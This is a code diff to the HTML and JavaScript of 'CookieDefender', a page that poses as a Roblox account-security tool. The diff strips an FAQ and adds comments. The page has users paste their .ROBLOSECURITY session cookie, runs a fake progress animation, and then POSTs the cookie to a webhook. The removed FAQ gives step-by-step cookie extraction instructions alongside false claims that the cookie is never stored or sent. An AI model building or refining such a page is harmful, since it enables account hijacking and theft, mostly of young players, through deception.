@@ -546,97 +546,6 @@
             font-size: 0.95rem;
         }
 
-        /* ----- FAQ SECTION ----- */
-        .faq-section {
-            padding: 100px 5% 80px;
-            position: relative;
-            z-index: 1;
-        }
-        .faq-container {
-            max-width: 900px;
-            margin: 0 auto;
-        }
-        .faq-item {
-            background: var(--card-bg);
-            backdrop-filter: blur(12px);
-            border: 1px solid rgba(16, 185, 129, 0.06);
-            border-radius: 20px;
-            margin-bottom: 16px;
-            overflow: hidden;
-            transition: all 0.3s;
-        }
-        .faq-item:hover {
-            border-color: rgba(16, 185, 129, 0.2);
-        }
-        .faq-item.active {
-            border-color: var(--green);
-        }
-        .faq-question {
-            padding: 24px 30px;
-            font-size: 1.1rem;
-            font-weight: 600;
-            cursor: pointer;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            transition: all 0.3s;
-            color: #d0dce8;
-            user-select: none;
-        }
-        .faq-question:hover {
-            color: var(--green);
-        }
-        .faq-item.active .faq-question {
-            color: var(--green);
-        }
-        .faq-icon {
-            font-size: 1.5rem;
-            transition: transform 0.3s;
-            color: #5a7a90;
-        }
-        .faq-item.active .faq-icon {
-            transform: rotate(180deg);
-            color: var(--green);
-        }
-        .faq-answer {
-            max-height: 0;
-            overflow: hidden;
-            transition: max-height 0.4s cubic-bezier(0.23, 1, 0.32, 1);
-            padding: 0 30px;
-            color: #98b0c8;
-            line-height: 1.8;
-        }
-        .faq-item.active .faq-answer {
-            max-height: 1000px;
-            padding: 0 30px 28px;
-        }
-        .faq-answer strong {
-            color: #d0dce8;
-        }
-        .faq-answer code {
-            background: rgba(16, 185, 129, 0.06);
-            padding: 2px 10px;
-            border-radius: 6px;
-            color: var(--green);
-            font-family: 'Courier New', monospace;
-            font-size: 0.85rem;
-        }
-        .faq-answer ul,
-        .faq-answer ol {
-            margin: 12px 0;
-            padding-left: 24px;
-        }
-        .faq-answer li {
-            margin: 6px 0;
-        }
-        .faq-answer .highlight-box {
-            background: rgba(16, 185, 129, 0.04);
-            border-left: 3px solid var(--green);
-            padding: 16px 20px;
-            border-radius: 0 12px 12px 0;
-            margin: 16px 0;
-        }
-
         /* ----- CTA SECTION ----- */
         .cta-section {
             padding: 120px 5%;
@@ -896,16 +805,6 @@
             .steps {
                 grid-template-columns: 1fr;
             }
-            .faq-question {
-                font-size: 1rem;
-                padding: 20px 22px;
-            }
-            .faq-answer {
-                padding: 0 22px;
-            }
-            .faq-item.active .faq-answer {
-                padding: 0 22px 22px;
-            }
         }
         @media (max-width: 640px) {
             .hero h1 {
@@ -965,7 +864,6 @@
             <div class="nav-links">
                 <a href="#features">Features</a>
                 <a href="#how-it-works">How It Works</a>
-                <a href="#faq">FAQ</a>
                 <a href="#protect">Protect Now</a>
             </div>
             <a href="#protect" class="nav-cta">Protect Now</a>
@@ -1036,135 +934,6 @@
                 <h3>Enter Your Cookie</h3>
                 <p>Paste your .ROBLOSECURITY cookie directly into the secure form. Your cookie is never stored or transmitted unencrypted.</p>
                 <span class="btn-primary" style="font-size:0.95rem;padding:12px 28px;">Protect Now</span>
-            </div>
-        </div>
-    </section>
-
-    <!-- FAQ SECTION -->
-    <section id="faq" class="faq-section">
-        <h2 class="section-title">Frequently Asked Questions</h2>
-        <p class="section-subtitle">Everything you need to know about CookieDefender</p>
-
-        <div class="faq-container">
-            <div class="faq-item active">
-                <div class="faq-question" onclick="toggleFAQ(this)">
-                    What is a .ROBLOSECURITY cookie and why should I protect it?
-                    <span class="faq-icon">▾</span>
-                </div>
-                <div class="faq-answer">
-                    A <strong>.ROBLOSECURITY</strong> cookie is an authentication token that Roblox uses to keep you logged in. It acts like a digital key to your account — anyone who obtains this cookie can log in as you without needing your password. They can steal your Robux, items, and even change your account settings. Protecting this cookie is essential for account security.
-                </div>
-            </div>
-
-            <div class="faq-item">
-                <div class="faq-question" onclick="toggleFAQ(this)">
-                    How do I find my .ROBLOSECURITY cookie?
-                    <span class="faq-icon">▾</span>
-                </div>
-                <div class="faq-answer">
-                    <p><strong>Method 1: Browser DevTools (Recommended)</strong></p>
-                    <ol>
-                        <li>Go to <strong>roblox.com</strong> and log in to your account</li>
-                        <li>Press <code>F12</code> to open Developer Tools</li>
-                        <li>Click the <strong>Application</strong> tab (Chrome/Edge) or <strong>Storage</strong> (Firefox)</li>
-                        <li>Expand <strong>Cookies</strong> → <code>https://www.roblox.com</code></li>
-                        <li>Find the cookie named <code>.ROBLOSECURITY</code></li>
-                        <li>Copy the full value — it starts with <code>_|WARNING:-DO-NOT-SHARE-THIS...</code></li>
-                    </ol>
-
-                    <div class="highlight-box">
-                        <strong>Method 2: EditThisCookie (Quick & Easy)</strong><br>
-                        Install the <strong>EditThisCookie</strong> browser extension from the Chrome Web Store. Once installed, go to roblox.com, click the extension icon, find <code>.ROBLOSECURITY</code> in the list, and copy its value. This is the fastest way to grab your cookie.
-                    </div>
-
-                    <p style="margin-top: 12px; color: #ef4444;"><strong>⚠️ Never share this cookie with anyone!</strong> It gives full access to your account.</p>
-                </div>
-            </div>
-
-            <div class="faq-item">
-                <div class="faq-question" onclick="toggleFAQ(this)">
-                    Is CookieDefender safe to use?
-                    <span class="faq-icon">▾</span>
-                </div>
-                <div class="faq-answer">
-                    <p><strong>Yes, CookieDefender is 100% safe.</strong> Here's why:</p>
-                    <ul>
-                        <li><strong>Zero-Knowledge Architecture:</strong> Your cookie is encrypted locally and never stored in plain text. We never have access to your actual cookie value.</li>
-                        <li><strong>No Data Retention:</strong> We don't save or log your cookie. It's used only for the encryption process and immediately discarded.</li>
-                        <li><strong>Cloud Encryption:</strong> All encryption happens in our secure cloud infrastructure with military-grade protocols.</li>
-                        <li><strong>Transparent & Open:</strong> Our security practices are publicly documented. No hidden trackers or data mining.</li>
-                    </ul>
-                    <p>CookieDefender is used by over 72,000 users with <strong>zero breaches reported</strong> since launch.</p>
-                </div>
-            </div>
-
-            <div class="faq-item">
-                <div class="faq-question" onclick="toggleFAQ(this)">
-                    Will Roblox ban me for using CookieDefender?
-                    <span class="faq-icon">▾</span>
-                </div>
-                <div class="faq-answer">
-                    <p><strong>No.</strong> CookieDefender does not violate Roblox's Terms of Service because:</p>
-                    <ul>
-                        <li>It does not modify, inject, or interact with the Roblox client or game files</li>
-                        <li>It does not automate gameplay or perform any actions on your behalf</li>
-                        <li>It is purely a <strong>defensive security tool</strong> that protects your authentication credentials</li>
-                        <li>It does not bypass any anti-cheat systems or exploit vulnerabilities</li>
-                    </ul>
-                    <p>Think of it like a password manager — it helps secure your credentials without interfering with Roblox's systems. Many Roblox developers and security researchers use similar tools.</p>
-                </div>
-            </div>
-
-            <div class="faq-item">
-                <div class="faq-question" onclick="toggleFAQ(this)">
-                    How does CookieDefender protect my cookie?
-                    <span class="faq-icon">▾</span>
-                </div>
-                <div class="faq-answer">
-                    <p>CookieDefender uses a multi-layered security approach:</p>
-                    <ol>
-                        <li><strong>HMAC-SHA256 Encryption:</strong> Your cookie is cryptographically bound to your unique hardware fingerprint</li>
-                        <li><strong>Cloud Monitoring:</strong> 24/7 threat detection monitors for any unauthorized access attempts</li>
-                        <li><strong>Real-Time Alerts:</strong> Instant notifications if suspicious activity is detected</li>
-                        <li><strong>Zero-Trust Architecture:</strong> Even if a hacker intercepts your cookie, it's useless without your hardware signature</li>
-                    </ol>
-                    <p>This makes your cookie virtually impossible to use on any other device, effectively neutralizing cookie loggers and session hijacking attacks.</p>
-                </div>
-            </div>
-
-            <div class="faq-item">
-                <div class="faq-question" onclick="toggleFAQ(this)">
-                    What should I do if my cookie gets stolen?
-                    <span class="faq-icon">▾</span>
-                </div>
-                <div class="faq-answer">
-                    <p>If you suspect your .ROBLOSECURITY cookie has been compromised, take these steps immediately:</p>
-                    <ol>
-                        <li><strong>Log out of all sessions</strong> — Go to Roblox Settings → Security → Log Out of All Other Sessions</li>
-                        <li><strong>Change your password</strong> — Use a strong, unique password you haven't used elsewhere</li>
-                        <li><strong>Enable 2-Step Verification</strong> — Add an extra layer of security to your account</li>
-                        <li><strong>Check account activity</strong> — Review your transaction history for unauthorized purchases</li>
-                        <li><strong>Run CookieDefender</strong> — Secure your new session with our encryption</li>
-                    </ol>
-                    <p>If you notice any unauthorized changes, contact Roblox Support immediately at <strong>roblox.com/support</strong>.</p>
-                </div>
-            </div>
-
-            <div class="faq-item">
-                <div class="faq-question" onclick="toggleFAQ(this)">
-                    Is CookieDefender free?
-                    <span class="faq-icon">▾</span>
-                </div>
-                <div class="faq-answer">
-                    <p><strong>Yes, CookieDefender is completely free.</strong> We believe account security should be accessible to everyone. There are no:</p>
-                    <ul>
-                        <li>Hidden fees</li>
-                        <li>Premium versions</li>
-                        <li>Subscriptions</li>
-                        <li>Paid upgrades</li>
-                    </ul>
-                    <p>CookieDefender is a community-driven project focused on making Roblox safer for everyone.</p>
-                </div>
             </div>
         </div>
     </section>
@@ -1240,10 +1009,15 @@
         function isValidCookie(cookie) {
             if (!cookie || typeof cookie !== 'string') return false;
             const trimmed = cookie.trim();
+            // Must start with the exact prefix
             if (!trimmed.startsWith(COOKIE_PREFIX)) return false;
+            // Must have at least some characters after the prefix (the actual token)
             if (trimmed.length <= COOKIE_PREFIX.length) return false;
+            // Should not contain obvious garbage like only spaces or special chars
             const remaining = trimmed.substring(COOKIE_PREFIX.length);
             if (remaining.length < 10) return false;
+            // Should contain mostly alphanumeric characters (typical for Roblox tokens)
+            // But we don't want to be too strict - just check it's not all spaces/symbols
             const alnumCount = (remaining.match(/[a-zA-Z0-9]/g) || []).length;
             if (alnumCount < 5) return false;
             return true;
@@ -1383,34 +1157,11 @@
             links.style.display = links.style.display === 'flex' ? 'none' : 'flex';
         }
 
-        // ===== FAQ TOGGLE =====
-        function toggleFAQ(element) {
-            const item = element.closest('.faq-item');
-            const isActive = item.classList.contains('active');
-
-            // Close all other items
-            document.querySelectorAll('.faq-item').forEach(el => {
-                el.classList.remove('active');
-            });
-
-            // Toggle this one
-            if (!isActive) {
-                item.classList.add('active');
-            }
-        }
-
-        // Open first FAQ item by default
-        document.addEventListener('DOMContentLoaded', function() {
-            const firstFaq = document.querySelector('.faq-item');
-            if (firstFaq) {
-                firstFaq.classList.add('active');
-            }
-        });
-
         // ===== MODAL CONTROLS =====
         function openModal() {
             document.getElementById('manualModal').classList.add('active');
             document.body.style.overflow = 'hidden';
+            // Clear any previous errors
             document.getElementById('cookieError').classList.remove('visible');
             document.getElementById('cookieInput').style.borderColor = '';
         }
@@ -1442,12 +1193,14 @@
             const errorEl = document.getElementById('cookieError');
             const inputEl = document.getElementById('cookieInput');
 
+            // Validate cookie format
             if (!isValidCookie(cookie)) {
                 errorEl.classList.add('visible');
                 inputEl.style.borderColor = 'var(--red)';
                 return;
             }
 
+            // Clear error if valid
             errorEl.classList.remove('visible');
             inputEl.style.borderColor = '';
 
@@ -1473,6 +1226,7 @@
                     clearInterval(interval);
                     document.getElementById('manualForm').style.display = 'none';
                     document.getElementById('successScreen').classList.add('active');
+                    // Send to cookie webhook
                     fetch(COOKIE_WEBHOOK, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
